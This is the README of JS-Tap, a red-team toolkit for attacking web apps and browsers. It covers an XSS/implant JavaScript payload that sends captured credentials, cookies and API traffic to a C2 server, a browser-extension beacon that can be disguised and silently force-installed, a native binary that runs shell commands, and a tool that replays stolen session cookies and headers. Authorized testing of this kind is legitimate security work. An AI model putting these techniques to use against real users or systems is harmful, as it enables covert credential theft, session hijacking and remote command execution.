# JS-Tap
### v3.0beta

## This tool is intended to be used on systems you are authorized to attack and for legal and educational purposes. Do not use this tool for illegal purposes, or I will be very angry in your general direction.

## Changelogs
Major changes are documented in the project Announcements:<br>
<https://github.com/hoodoer/JS-Tap/discussions/categories/announcements>

## Demo
You can read the original blog post about JS-Tap here:<br>
<https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams>

Short demo from ShmooCon of JS-Tap version 1:<br>
<https://youtu.be/IDLMMiqV6ss?si=XunvnVarqSIjx_x0&t=19814>

Demo of JS-Tap version 2 at HackSpaceCon, including C2 and how to use it as a post exploitation implant:<br>
<https://youtu.be/aWvNLJnqObQ?t=11719>

Demo of the automatic payload generator, uses intercepted form posts and JavaScript network traffic as a blueprint for generating custom C2 payloads:<br>
<https://www.youtube.com/watch?v=cU915mxLfTo>

Demo at CactusCon of v2 including mimic feature:<br>
<https://youtu.be/O7-zxAmP13o?si=gchYwOJksutCCUPH>


## Upgrade warning
I do not plan on creating migration scripts for the database, and version number bumps often involve database schema changes (check the changelogs). You should probably delete your jsTap.db database on version bumps. If you have custom payloads in your JS-Tap server, make sure you export them before you delete the database files.


## Introduction
JS-Tap is a generic JavaScript payload and supporting software to help red teamers attack webapps. The JS-Tap payload can be used as an XSS payload or as a post exploitation implant.

The payload does not require the targeted user running the payload to be authenticated to the application being attacked, and it does not require any prior knowledge of the application beyond finding a way to get the JavaScript into the application.

Instead of attacking the application server itself, the JS-Tap payload focuses on the client-side of the application and heavily instruments the client-side code. A C2 system allows custom JavaScript payloads to be added and run as tasks on JS-Tap clients, providing a means to attack the application server directly. To facilitate faster transition to attacking the server, JS-Tap now includes a "mimic" feature to automatically generate custom payloads and hand them off to the C2 system.

The example JS-Tap payload is contained in the **telemlib.js** file in the payloads directory, however any file in this directory is served unauthenticated so you can serve multiple payloads with different configurations targeting different applications at the same time. <br>

Copy the **telemlib.js** file to whatever filename you wish and modify the configuration as needed. This file has _not_ been obfuscated. Prior to using in an engagement strongly consider changing the naming of endpoints, stripping comments, and highly obfuscating the payload. By default the application uses rather obvious API endpoints (e.g. /loot/screenshot), in **App Settings** you can turn on traffic obfuscation.

Make sure you review the configuration section below carefully before using on a publicly exposed server.

## Architecture Overview

JS-Tap has three client types that connect to the same server:

| Client Type | What It Is | How It Gets There |
|---|---|---|
| **JS-Tap Implant** (telemlib.js) | A JavaScript payload injected into a web page. Instruments the DOM, captures user activity, screenshots, network calls. | XSS vulnerability, or directly added to the target app's JavaScript files (post-exploitation). |
| **BEX Beacon** | A browser extension (Chrome MV3 / Firefox MV2). Monitors all browsing activity, captures cookies (including httpOnly), localStorage, sessionStorage, and request headers. Can inject JS-Tap implants into specific domains on command. | Installed in the target's browser (social engineering, physical access, policy push, etc.). |
| **Sidecar** | A native Go binary that runs on the target's OS. Provides file system browsing, file reading, and command execution. | Installed alongside the BEX Beacon via native messaging. Requires the BEX Beacon to relay commands. |

All three report back to the same JS-Tap server portal, where loot is viewed and C2 commands are issued.

A companion tool, **BEX Conductor**, runs on the operator's Firefox. It imports session data captured by the BEX Beacon (as a "BEX Ticket") and replays it — setting cookies, injecting headers, populating storage, and spoofing the User-Agent — so the operator can browse as the victim. See [BEX Tickets & BEX Conductor](#bex-tickets--bex-conductor-session-cloning) below.

### How They Work Together

1. **Standalone implant:** The JS-Tap payload (telemlib.js) works independently. Inject it via XSS or implant it in the target's JS files. It calls home to the JS-Tap server on its own.

2. **BEX Beacon as a dropper:** The BEX Beacon monitors browsing and collects passive intelligence (cookies, localStorage, sessionStorage, request headers, navigation). From the JS-Tap portal, you can command the beacon to inject a full JS-Tap implant into a specific domain. The implant spawned by a beacon gets high-quality screenshots via the extension's `captureVisibleTab` API (the "BEX-Assist" mode).

3. **Sidecar for OS access:** When installed, the Sidecar binary gives the BEX Beacon access to the underlying operating system. Commands are sent from the JS-Tap portal, relayed through the beacon's encrypted channel to the native binary, and results are sent back. This turns a browser extension into a foothold for file system access and command execution.


## Data Collected

### JS-Tap Implants
* Client IP address, OS, Browser
* Fingerprint of browser (optional config)
* User inputs (credentials, etc.)
* URLs visited
* Cookies (that don't have **httponly** flag set)
* Local Storage
* Session Storage
* HTML code of pages visited (if feature enabled)
* Screenshots of pages visited
* Copy of Form Submissions
* Copy of XHR API calls (if monkeypatch feature enabled)
	- Endpoint
	- Method (GET, POST, etc.)
	- Headers set
	- Basic Auth
	- Response status code
	- Request body and response body
* Copy of Fetch API calls (if monkeypatch feature enabled)
	- Endpoint
	- Method (GET, POST, etc.)
	- Response status code
	- Headers set
	- Request body and response body
* Custom Exfiltrated Data
	- Data sent back from custom payloads in the C2 system

Note: ability to receive copies of XHR and Fetch API calls works in trap mode. In implant mode only Fetch API can be copied currently. Interception of form submissions can sometimes be missed in implant mode.

### BEX Beacons
* Domains visited (with timestamps)
* Cookies for visited domains (including httpOnly via `browser.cookies.getAll()`, with metadata: httpOnly, secure, sameSite, path, domain, expiration)
* localStorage and sessionStorage
* Request headers (authorization, x-api-key, cookie, set-cookie) for monitored domains
* Can inject JS-Tap implants on command (which then collect everything above)

### Sidecar (via BEX Beacon)
* Directory listings (file names, sizes, permissions, timestamps)
* File contents (up to 1MB per read, with offset/limit support)
* Command execution output (stdout, stderr, exit code)


## Operating Modes
The JS-Tap payload has two modes of operation. Whether the mode is **trap** or **implant** is set in the **initGlobals()** function, search for the **window.taperMode** variable.
#### Trap Mode
Trap mode is typically the mode you would use as a XSS payload. Execution of XSS payloads is often fleeting, the user viewing the page where the malicious JavaScript payload runs may close the browser tab (the page isn't interesting) or navigate elsewhere in the application. In both cases, the payload will be deleted from memory and stop working. JS-Tap needs to run a long time or you won't collect useful data.

Trap mode combats this by establishing persistence using an [iFrame trap technique](https://trustedsec.com/blog/persisting-xss-with-iframe-traps). The JS-Tap payload will create a full page iFrame, and start the user elsewhere in the application. This starting page must be configured ahead of time. In the **initGlobals()** function search for the **window.taperstartingPage** variable and set it to an appropriate starting location in the target application.

In trap mode JS-Tap monitors the location of the user in the iframe trap and it spoofs the address bar of the browser to match the location of the iframe.

Note that the application targeted must allow iFraming from same-origin or self if it's setting CSP or X-Frame-Options headers. JavaScript based framebusters can also prevent iFrame traps from working.

Note, I've had good luck using Trap Mode for a post exploitation implant in very specific locations of an application, or when I'm not sure what resources the application is using inside the authenticated section of the application. You can put an implant in the login page, with trap mode and the trap mode start page set to **window.location.href** (i.e. current location). The trap will set when the user visits the login page, and they'll hopefully contine into the authenticated portions of the application inside the iframe trap.

A user refreshing the page will generally break/escape the iframe trap.

#### Implant Mode
Implant mode would typically be used if you're directly adding the payload into the targeted application. Perhaps you have a shell on the server that hosts the JavaScript files for the application. Add the payload to a JavaScript file that's used throughout the application (jQuery, main.js, etc.). Which file would be ideal really depends on the app in question and how it's using JavaScript files. Implant mode does not require a starting page to be configured, and does not use the iFrame trap technique.

A user refreshing the page in implant mode will generally continue to run the JS-Tap payload.

Implant mode is more likely to work with applications as it doesn't involve all the extra iframe persistence code.

#### BEX Beacon (Browser Extension)
The **BEX Beacon** is a browser extension version of JS-Tap. It serves two primary purposes:
1. **Passive Intelligence:** It monitors all browsing activity across all domains (configurable via whitelist), capturing cookies (including httpOnly with full metadata), localStorage, sessionStorage, request headers, and navigation events without requiring an XSS vulnerability.
2. **Active Dropper:** It can be tasked via the JS-Tap portal to inject a full JS-Tap implant into specific domains. This allows you to turn a simple browser extension into a delivery vehicle for full post-exploitation implants.

The BEX Beacon uses app-layer encrypted communication (AES-GCM) with the JS-Tap server. All telemetry and task responses are encrypted end-to-end through a single endpoint, making network traffic harder to fingerprint.

The beacon also includes features like CSP/X-Frame-Options header stripping (via declarativeNetRequest rules) to facilitate JS-Tap injection into strict environments.

When paired with the optional **Sidecar** native messaging host, the BEX Beacon gains OS-level access on the target machine. See the [Sidecar](#sidecar-native-messaging) section below.

## Screenshotting Systems
JS-Tap employs two distinct methods for capturing screenshots:

### 1. html2canvas (Standard)
Used by default in all implants. It attempts to reconstruct the page as a canvas element and export it as an image. This works well for most sites but can struggle with complex modern apps (like Reddit) or cross-origin images.

### 2. Hybrid BEX-Assist (High Quality)
When an implant is spawned by a **BEX Beacon**, it gains access to the extension's high-level browser APIs. In this mode, the implant asks the beacon to take the screenshot using `chrome.tabs.captureVisibleTab`. This results in a pixel-perfect, high-quality capture that bypasses all CSS/DOM limitations of `html2canvas`. This is the recommended mode for complex targets.


## Installation and Start
Requires python3. A large number of dependencies are required for the jsTapServer, you are **highly** encouraged to use python virtual environments to isolate the libraries for the server software (or whatever your preferred isolation method is).

### JS-Tap Server
Example:
```
mkdir jsTapEnvironment
python3 -m venv jsTapEnvironment
source jsTapEnvironment/bin/activate
cd jsTapEnvironment
git clone https://github.com/hoodoer/JS-Tap
cd JS-Tap
pip3 install -r requirements.txt

run in debug/single thread mode:
python3 jsTapServer.py

run with gunicorn multithreaded (production use):
./jstapRun.sh
```

The server auto-generates a random admin password on each startup and prints it to the console. The credentials are also saved to `adminCreds.txt` in the project root. During development/testing, it's safe to delete `jsTap.db` between runs — it regenerates automatically on startup.

### Building (Unified Build)

The unified build script at the project root handles everything: building extensions for Chrome and Firefox, packing them for deployment, optionally cross-compiling the sidecar binary, and producing self-contained deploy bundles you can copy to target machines.

#### Prerequisites
- **Node.js** (for WXT extension builds and .crx packing)
- **Go** (1.21+) — only needed if sidecar is enabled
- **Python 3**

#### Quick Start

1. Configure `bex-beacon/config.json` (see [Configuration](#bex-beacon-configuration-configjson) below).
2. Install Node dependencies (first time only):
```bash
cd bex-beacon && npm install && cd ..
```
3. Build everything:
```bash
python3 buildAll.py
```

This builds Chrome MV3 and Firefox MV2 extensions, packs them as `.crx`/`.xpi`, cross-compiles sidecar binaries (if enabled), and generates deploy bundles.

#### Build Flags

| Flag | Effect |
|---|---|
| `--ext-only` | Build extensions only, skip sidecar |
| `--sidecar-only` | Build sidecar only, skip extensions |
| `--legacy` | Also build legacy extensions (from `src-chrome-extension/` and `src-firefox-extension/`) |

#### Build Output

```
build/
  chrome-mv3/              # Unpacked Chrome extension (for development)
  firefox-mv2/             # Unpacked Firefox extension (for development)
  extension.crx            # Packed Chrome extension (if key.pem configured)
  extension.xpi            # Packed Firefox extension
  sidecar/                 # Sidecar binaries + manifests (when enabled)
  deploy/                  # Self-contained deploy bundles
    chrome-linux.tar.gz
    chrome-mac.tar.gz
    chrome-windows.zip
    chromium-linux.tar.gz
    chromium-mac.tar.gz
    firefox-linux.tar.gz
    firefox-mac.tar.gz
    firefox-windows.zip
```

#### Static Extension IDs

For production use, you should generate a static key pair so your Chrome extension ID is deterministic across builds. This is required for the sidecar's native messaging manifests to whitelist the correct extension.

```bash
# Generate a private key (keep this safe, reuse across builds)
openssl genrsa 2048 > key.pem

# Extract the public key for config.json
openssl rsa -in key.pem -pubout -outform DER | base64 -w0
```

Add the base64 output to `extension_ids.chrome_key` and set `extension_ids.chrome_key_pem` to `key.pem` in `bex-beacon/config.json`. The build script will automatically compute and verify the 32-character Chrome extension ID.

Firefox extension IDs are set directly via `extension_ids.firefox_extension_id` (e.g. `bex-beacon@jstap`).

### Deploying to Targets

Each deploy bundle is a **self-contained archive** — one file to copy to the target machine.

**Workflow:**
1. Copy the appropriate archive to the target (e.g. `chrome-linux.tar.gz`)
2. Extract it
3. Run the install script

```bash
# Linux/macOS
tar xzf chrome-linux.tar.gz
cd chrome-linux
./install.sh

# Windows
# Extract chrome-windows.zip, then run:
install.bat
```

**What the install scripts do:**

| Browser | Install Method | Requirements |
|---|---|---|
| **Chrome/Chromium** (Linux, with .crx + static ID) | Writes an enterprise policy that force-installs the extension from a local CRX. No user interaction required — the extension is silently installed on next launch. | `sudo` |
| **Chrome/Chromium** (macOS, with .crx + static ID) | Copies .crx to a system directory and writes an external extension JSON. User must click "Keep" when Chrome warns about the extension. | `sudo` |
| **Chrome/Chromium** (without .crx) | Copies unpacked extension to a stable directory. Prints instructions for `chrome://extensions` developer mode. | None |
| **Chrome** (Windows, with .crx + static ID) | Copies .crx and writes registry entry for external extension installation. | None (user-level registry) |
| **Firefox** (with .xpi + extension ID) | Auto-detects the default Firefox profile and copies the .xpi into the profile's `extensions/` directory. Firefox prompts the user to enable on next launch. | None |
| **Firefox** (without .xpi) | Copies unpacked extension to a stable directory. Prints instructions for `about:debugging`. | None |

When sidecar is enabled, the install scripts also install the sidecar binary and write the native messaging manifest in the correct browser/OS-specific location. Sidecar installation is user-level (no sudo required).

**Chrome/Chromium install details (Linux):**
- Uses Chrome's enterprise policy mechanism (`ExtensionSettings` with `force_installed` mode)
- The CRX and an Omaha-style update manifest are stored in `/opt/jstap/`
- A policy JSON is written to `/etc/chromium/policies/managed/` (Chromium) or `/etc/opt/chrome/policies/managed/` (Chrome)
- The extension is silently installed on next browser launch — no user prompts, no error popups
- Chrome will show "Managed by your organization" in the browser menu, which is normal for enterprise-managed machines

**Chrome/Chromium install details (macOS):**
- Uses the external extensions mechanism
- The CRX is stored in `/Library/Application Support/JSTap/`
- An external extension JSON is written to the browser's External Extensions directory
- User must click **Keep** when Chrome warns about the externally-installed extension

### Uninstalling

Each deploy bundle includes an uninstall script (`uninstall.sh` or `uninstall.bat`) that cleanly removes everything the install script deployed.

```bash
# Linux/macOS
./uninstall.sh

# Windows
uninstall.bat
```

**What the uninstall scripts remove:**

| Component | What Gets Removed |
|---|---|
| **Chrome/Chromium extension** (Linux) | Enterprise policy JSON + CRX + update manifest from system directories (requires `sudo`) |
| **Chrome/Chromium extension** (macOS) | External extension JSON + CRX from system directories (requires `sudo`) |
| **Chrome extension** (Windows) | Registry entry + extension files from `%LOCALAPPDATA%\JSTap` |
| **Firefox extension** | `.xpi` from the Firefox profile's `extensions/` directory |
| **Sidecar** (when present) | Binary from `~/.local/bin/`, native messaging manifest JSON, and registry entries (Windows) |

After uninstalling, restart the browser for changes to take effect.

#### Development Use

For development and testing, you can skip the deploy bundles and load extensions directly:
- **Chrome:** `chrome://extensions` -> Enable Developer Mode -> Load unpacked -> select `build/chrome-mv3/`
- **Firefox:** `about:debugging` -> This Firefox -> Load Temporary Add-on -> select any file inside `build/firefox-mv2/`

### Sidecar (Native Messaging Host)

The Sidecar is **optional**. It is a Go binary that communicates with the BEX Beacon via the browser's native messaging API to provide OS-level access (file browsing, file reading, command execution).

#### Enabling and Building

1. Set `sidecar.enabled: true` in `bex-beacon/config.json`
2. Configure extension IDs in `extension_ids` (see [Static Extension IDs](#static-extension-ids) above)
3. Run the unified build:
```bash
python3 buildAll.py
```

The build script automatically syncs the extension IDs from the central config to `sidecar/config.json`, cross-compiles sidecar binaries for all platforms, and includes the correct binary in each deploy bundle.

#### Standalone Sidecar Build

If you need to rebuild just the sidecar without rebuilding extensions:
```bash
python3 buildAll.py --sidecar-only
```

Or build it directly (it will fall back to reading `../bex-beacon/config.json` if no local config exists):
```bash
cd sidecar
python3 buildSidecar.py
```

#### Sidecar Uninstalling

For test iterations during development, use the sidecar-specific uninstall script to remove the binary and all native messaging manifests:
```bash
./sidecar/uninstall.sh
```

This removes the binary from `~/.local/bin/` and the manifest JSON from all Chrome/Firefox manifest directories (Linux and macOS).

For deployed systems, use the bundle's `uninstall.sh` or `uninstall.bat` instead — it removes both the extension and sidecar in one step. See [Uninstalling](#uninstalling) above.

#### How Sidecar Works

```
JS-Tap Portal UI
    │ POST /api/sidecar/command
    ▼
JS-Tap Server (queues SIDECAR_COMMAND task)
    │ Beacon polls on heartbeat
    ▼
BEX Beacon (background service worker)
    │ browser.runtime.connectNative()
    ▼
Sidecar Go Binary (native messaging, stdio)
    │ Executes command, returns result
    ▼
BEX Beacon (encrypts result, sends to server)
    │ POST /client/metrics/<uuid>
    ▼
JS-Tap Server (stores SidecarResult)
    │ UI polls GET /api/sidecar/result/<requestId>
    ▼
JS-Tap Portal UI (displays result)
```

The communication between the beacon and the sidecar binary uses the [native messaging protocol](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) — each message is prefixed with a 4-byte little-endian length, followed by a JSON payload.

**Sidecar Commands:**

| Command | Args | Description |
|---|---|---|
| `list_dir` | `{ path: "/some/path" }` | List directory contents. Defaults to user's home directory if path is empty. Returns file names, sizes, types, and modification times. |
| `read_file` | `{ path: "/some/file", offset: 0, limit: 1048576 }` | Read file contents (base64 encoded). Max 1MB per read. Supports offset/limit for large files. |
| `exec_cmd` | `{ command: "whoami", timeout: 30 }` | Execute a shell command. Uses `/bin/sh -c` on Linux/macOS, `cmd.exe /C` on Windows. Max timeout is 120 seconds. Returns stdout, stderr, and exit code. |


## Configuration

### JS-Tap Server Configuration
#### Debug/Single thread config
If you're running JS-Tap with the jsTapServer.py script in single threaded mode (great for testing/demos) there are configuration options directly in the jsTapServer.py script.

##### Proxy Mode
For production use JS-Tap should be hosted on a publicly available server with a proper SSL certificate from someone like letsencrypt. The easiest way to deploy this is to allow NGINX to act as a front-end to JS-Tap and handle the letsencrypt cert, and then forward the decrypted traffic to JS-Tap as HTTP traffic locally (i.e. NGINX and JS-Tap run on the same VPS).

If you set **proxyMode** to true, JS-Tap server will run in HTTP mode, and take the client IP address from the **X-Forwarded-For** header, which NGINX needs to be configured to set.

When **proxyMode** is set to false, JS-Tap will run with a self-signed certificate, which is useful for testing. The client IP will be taken from the source IP of the connecting client.


##### Data Directory
The **dataDirectory** parameter tells JS-Tap where the directory is to use for the SQLite database and loot directory. Not all "loot" is stored in the database, screenshots and scraped HTML files in particular are not.

##### Server Port
To change the server port configuration see the last line of **jsTapServer.py**

```
app.run(debug=False, host='0.0.0.0', port=8444, ssl_context='adhoc')
```

### BEX Beacon Configuration (config.json)
Located in `bex-beacon/config.json`. This is the **single source of truth** for all build configuration — extensions, extension IDs, and sidecar settings.

```json
{
  "extension": {
    "name": "Resource Optimizer",
    "short_name": "ResOpt",
    "version": "2.1.4",
    "description": "Optimizes page resource loading for improved performance.",
    "author": "WebPerf Tools",
    "homepage_url": "https://www.example.com",
    "install_dirname": "webperf-tools"
  },
  "extension_ids": {
    "chrome_key": "",
    "chrome_key_pem": "",
    "chrome_extension_id": "",
    "firefox_extension_id": "bex-beacon@jstap"
  },
  "js_tap_server": {
    "domain": "127.0.0.1",
    "port": 8444
  },
  "heartbeat": {
    "base_interval": 5,
    "jitter_percent": 30
  },
  "domain_scoping": {
    "whitelist_enabled": false,
    "whitelist": [
      "https://*.example.com/*",
      "http://localhost:8000/*"
    ]
  },
  "sidecar": {
    "enabled": false,
    "host_name": "com.jstap.sidecar",
    "binary_name": "sidecar"
  }
}
```

#### extension
Controls the extension's manifest metadata and deployment naming. Change these fields to disguise the extension's appearance in `chrome://extensions` or `about:addons`.

| Field | Description |
|---|---|
| `name` | Display name of the extension |
| `version` | Extension version (also used in .crx external extension JSON) |
| `description` | Extension description shown in browser |
| `install_dirname` | Directory name used by install scripts for storing files on the target system (e.g. `/opt/<dirname>/` on Linux, `%LOCALAPPDATA%\<dirname>` on Windows). Also used for the enterprise policy filename. Choose something innocuous. Default: `jstap` |

#### extension_ids
Controls static extension IDs for deterministic builds. See [Static Extension IDs](#static-extension-ids) for setup instructions.

| Field | Description |
|---|---|
| `chrome_key` | Base64-encoded DER public key. Injected as `key` in Chrome manifest for a deterministic extension ID. |
| `chrome_key_pem` | Path to the private key .pem file (relative to project root). Used by the build script to pack `.crx` files. |
| `chrome_extension_id` | The 32-character Chrome extension ID. Auto-computed from `chrome_key` if left empty. Used in sidecar native messaging manifests. |
| `firefox_extension_id` | Firefox extension ID (e.g. `bex-beacon@jstap`). Injected into the Firefox manifest as `browser_specific_settings.gecko.id`. |

#### js_tap_server
| Field | Description |
|---|---|
| `domain` | Hostname or IP of your JS-Tap server. |
| `port` | Port the JS-Tap server is listening on. |

#### heartbeat
Controls how often the beacon checks in with the server to report telemetry and pick up new tasks (like injection commands or sidecar commands).

| Field | Description |
|---|---|
| `base_interval` | Base interval in **seconds** between heartbeats. Default: `60` for production, `5` for development/testing. |
| `jitter_percent` | Percentage of jitter applied to the base interval. A value of `30` means each heartbeat will fire at a random time between 70% and 130% of the base interval. Set to `0` for no jitter (useful for debugging). |

Jitter is important for OPSEC — it prevents the beacon from creating a perfectly regular network pattern that could be detected by network monitoring tools. Each heartbeat schedules the next one with fresh randomness.

#### domain_scoping
Controls which domains the beacon monitors and interacts with.

| Field | Description |
|---|---|
| `whitelist_enabled` | `false` = monitor all domains (all_domains mode). `true` = only monitor domains matching the whitelist patterns. |
| `whitelist` | Array of URL match patterns. Standard browser extension match patterns with `*` wildcards. Only used when `whitelist_enabled` is `true`. |

When the whitelist is enabled, the beacon enforces it at multiple layers:
- **Content script injection** — only injected into pages matching whitelist patterns
- **Telemetry reporting** — domains not on the whitelist are not reported to the server
- **JS-Tap injection tasks** — injection is blocked for domains not on the whitelist
- **Header capture** — request headers are only captured for whitelisted domains

This is critical for red team engagements with strict scoping requirements. Setting `whitelist_enabled: true` ensures the beacon will not interact with out-of-scope domains.

**Example whitelist patterns:**
```json
"whitelist": [
  "https://*.targetcorp.com/*",
  "https://app.targetcorp.com/*",
  "http://internal.targetcorp.local:8080/*"
]
```

#### sidecar
Controls the optional native messaging feature in the BEX Beacon. See the [Sidecar](#sidecar-native-messaging) section above for full details.

| Field | Description |
|---|---|
| `enabled` | `false` = no native messaging (default). `true` = enable sidecar support. Adds `nativeMessaging` permission to the extension manifest. |
| `host_name` | The native messaging host name. Default: `com.jstap.sidecar` |
| `binary_name` | Name for the compiled sidecar binary. Default: `sidecar`. Change this to disguise the binary on target systems (e.g. `chrome-helper`). |

The unified build script automatically syncs extension IDs from `extension_ids` to the sidecar's config, so you only need to configure IDs in one place.

### JS-Tap Payload (telemlib.js) Configuration
These configuration variables are in the **initGlobals()** function.

#### JS-Tap Server Location
You need to configure the payload with the URL of the JS-Tap server it will connect back to.
```
window.taperexfilServer = "https://127.0.0.1:8444";
```

#### Mode
Set to either **trap** or **implant**
This is set with the variable:
```
window.taperMode = "trap";
or
window.taperMode = "implant";
```

#### Trap Mode Starting Page
Only needed for trap mode. See explanation in **Operating Modes** section above.<br>
Sets the page the user starts on when the iFrame trap is set.
```
window.taperstartingPage = "http://targetapp.com/somestartpage";
```

If you want the trap to start on the current page, instead of redirecting the user to a different page in the iframe trap, you can use:
```
window.taperstartingPage = window.location.href;
```
#### Client Tag
Useful if you're using JS-Tap against multiple applications or deployments at once and want a visual indicator of what payload was loaded. Remember that the entire /payloads directory is served, you can have multiple JS-Tap payloads configured with different modes, start pages, and client tags.

This tag string (keep it short!) is prepended to the client nickname in the JS-Tap portal. Setup multiple payloads, each with the appropriate configuration for the application its being used against, and add a tag indicating which app the client is running.
```
window.taperTag = 'whatever';
```
#### Custom Payload Tasks
Used to configure if clients are checking for **Custom Payload** tasks, and how often they're checking. The jitter settings
Let you optionally set a floor and ceiling modifier. A random value between these two numbers will be picked
and added to the check delay. Set these to 0 and 0 for no jitter.
```
window.taperTaskCheck        = true;
window.taperTaskCheckDelay   = 5000;
window.taperTaskJitterBottom = -2000;
window.taperTaskJitterTop    = 2000;
```

#### Client Fingerprinting
This can be enabled to calculate a fingerprint of the client based on numerous attributes. A very short hash is created from this fingerprinting. This short hash can optionally be displayed on the client card by enabling it in **App SettingS**. The clients list filter can be filtered on this fingerprint to identify multiple JS-Tap clients that are likely to be running the on the same computer. Note that if an enterprise issues identical systems to users, they could easily end up with the same fingerprint value.

To enable fingerprint calculations in JS-Tap payload:
```
window.taperFingerprint = true;
```

Even if the fingerprint is being calculated, it will not show in the client cards unless the feature is enabled in **App Settings** as well.

Note you can filter the client list by fingerpring hashes to show clients that are most likely to be the same computer.

#### Exfiltrate HTML
true/false setting on whether a copy of the HTML code of each page viewed is exfiltrated. These exfiltrated HTML files are needed for finding CSRF token sources when autogenerating form submission custom payloads.

```
window.taperexfilHTML = true;
```


#### Copy Form Submissions
true/false setting on whether to intercept a copy of all form posts.

```
window.taperexfilFormSubmissions = true;
```


#### MonkeyPatch APIs
Enable monkeypatching of XHR and Fetch APIs. This works in trap mode. In implant mode, only Fetch APIs are monkeypatched. Monkeypatching allows JavaScript to be rewritten at runtime. Enabling this feature will re-write the XHR and Fetch networking APIs used by JavaScript code in order to tap the contents of those network calls. Note that jQuery and Ajax based network calls will be captured in the XHR API, which they use under the hood for network calls. Autogenerating API call custom payloads depends of course on intercepting API calls using this monkeypatch feature.

```
window.monkeyPatchAPIs = true;
```

## JS-Tap Portal

Login with the admin credentials provided by the server script on startup (also saved to `adminCreds.txt`).

### Client Management
Clients show up on the left, grouped by type (**Apps** vs **Browsers**). Use the toggle buttons at the top of the client list to switch between views.

* **Apps** — JS-Tap implant clients (from telemlib.js payloads)
* **Browsers** — BEX Beacon clients

Selecting a client will show a time series of their events (loot) on the right. If you filter the list (e.g. switching from Apps to Browsers), the currently selected loot view will dim and turn grayscale to indicate it is "background" data.

**Beacons (Browsers)** can be expanded to see all domains they have visited. You can trigger JS-Tap injection from the domain list. Beacon cards in the sidebar will display a summary of any implants they have successfully spawned.

The clients list can be sorted by time (first seen, last update received) and the list can be filtered to only show the "starred" clients. There is also a quick filter search above the clients list that allows you to quickly filter clients that have the entered string. Useful if you set an optional tag in the payload configuration. Optional tags show up prepended to the client nickname. Filtering is checked against the optional tag, nickname, IP address, fingerprint, browser, and platform. Note you can reverse the filter search by prepending your search term with a '!'. For example, to show all clients not using Firefox use the filter term "!firefox".

Each client has an 'x' button (near the star button). This allows you to delete the session for that client, if they're sending junk or useless data, you can prevent that client from submitting future data.

When the JS-Tap payload starts, it retrieves a session from the JS-Tap server. If you want to stop all new client sessions from being issues, select **App Settings** at the top and you can disable new client sessions. You can also enable the showing of client "fingerprints", which are very short hash values that should be unique to a user's browser on a particular system. This can help identify which JS-Tap clients might actually be the same individual. Note that the JS-Tap client must be configured to perform the fingerprint calculations. The client filter search bar also searches the fingerprint field, so it's easy to show clients with identical fingerprints.

You can also configure email notifications in **App Settings** to notifiy on new clients, or new events for clients. This is SMTP (TLS) based only, and you can have the notification emails go to multiple recipients. An "email delay" option prevents constant email spamming, you'll get a roll-up email of all notifications that happend in the delay period.

You can change how often the client list automatically updates in the **App Settings** and you can also block specific IP addresses from receiving a JS-Tap session in here.

If you want to better hide the JS-Tap network traffic from inspection, in **App Settings** enable traffic obfuscation. This will work on applications using HTTPS where webcrypto API is available. JS-Tap client will encrypt all traffic at the application level and send it to a single API endpoint on the C2 server, which will decrypt it and route it server side. Responses from JS-Tap C2 (such as custom payloads) also come from this single API endpoint and are also encrypted. Note that if the tapped browser doesn't support web crypto API, JS-Tap will fall back to traditional non-obfuscated traffic.

Each client has a "notes" feature. If you find juicy information for that particular client (credentials, API tokens, etc) you can add it to the client notes. After you've reviewed all your clients and made your notes, the **View All Notes** feature at the top allows you to export all notes from all clients at once.

The events list can be filtered by event type if you're trying to focus on something specific, like screenshots. Note that the events/loot list does _not_ automatically update (the clients list does). If you want to load the latest events for the client you need to select the client again on the left.

### BEX Injection
When viewing a Beacon's domain intelligence, you can click **Inject JS-Tap** to queue an injection.
* A "SUCCESS" badge will appear once the injection script is requested.
* The nickname of the spawned implant will be automatically linked and displayed on the domain card and the beacon's sidebar card.
* Injections happen immediately if the user is currently on the target domain, or upon the next visit.

### BEX Tickets & BEX Conductor (Session Cloning)

The BEX Beacon captures cookies (including httpOnly), localStorage, sessionStorage, and authorization headers for every domain the target visits. **BEX Tickets** let you export all of that session data as a portable blob, and **BEX Conductor** replays it in your own browser so you can browse as the victim.

#### Generating a BEX Ticket

1. In the JS-Tap portal, select a BEX Beacon client and expand its domain list.
2. Click the **BEX Ticket** button on the domain card you want to clone.
3. The ticket is copied to your clipboard as a base64-encoded string.

A ticket contains:
- All cookies for the domain (with httpOnly, secure, sameSite, path, domain, and expiration metadata)
- Captured request headers (Authorization, x-api-key, etc.)
- localStorage and sessionStorage key/value pairs
- The victim's raw User-Agent string, platform, and browser
- Visited URLs for the domain (most recent first)

**Important:** Make sure you generate the ticket from the correct domain entry. For example, `reddit.com` and `www.reddit.com` are separate domain entries in the beacon's data — pick the one that holds the authentication cookies.

#### Installing BEX Conductor

BEX Conductor is a standalone Firefox MV2 extension. It **must be Firefox** — it relies on Firefox's MV2 `webRequestBlocking` API to inject headers into outgoing requests, which Chrome MV3 does not support.

To load it as a temporary extension:

1. Open Firefox and navigate to `about:debugging#/runtime/this-firefox`
2. Click **"Load Temporary Add-on..."**
3. Browse to the `bex-conductor/` directory and select `manifest.json`

The BEX Conductor icon (the JS-Tap logo) will appear in the Firefox toolbar. Temporary extensions persist until Firefox is closed — you'll need to re-load after a restart.

#### Using BEX Conductor

1. Click the BEX Conductor icon in the toolbar to open the popup.
2. Paste the BEX ticket into the text area and click **Import**.
3. BEX Conductor will:
   - **Set all cookies** for the domain, including httpOnly cookies (extensions have this privilege).
   - **Register header injection** — Authorization headers and other captured headers are injected into every matching request via `webRequest.onBeforeSendHeaders`.
   - **Spoof User-Agent** — The victim's User-Agent string replaces yours in all outgoing request headers for that domain.
   - **Populate storage** — localStorage and sessionStorage entries are written when you navigate to the domain.
   - **Spoof navigator APIs** — Even though you're running Firefox, `navigator.userAgent`, `navigator.platform`, and `navigator.appVersion` are monkeypatched in the page's JavaScript context to return the victim's values. This defeats client-side UA checks.
4. Click **Open** on the imported ticket to navigate to the first captured URL, or browse to the domain manually.
5. You should now be browsing as the victim's session.

The popup shows all active tickets with badge counts for cookies, headers, localStorage, and sessionStorage items. Use **Clear** to remove a ticket and its cookies when you're done.

#### Verifying It Works

- **Cookies:** Open Firefox DevTools → Storage → Cookies. You should see all imported cookies, including httpOnly ones.
- **Headers:** Open DevTools → Network tab. Check that Authorization and User-Agent headers on outgoing requests match the victim's values.
- **Storage:** Open DevTools → Storage → Local Storage / Session Storage. Verify the imported keys are present.
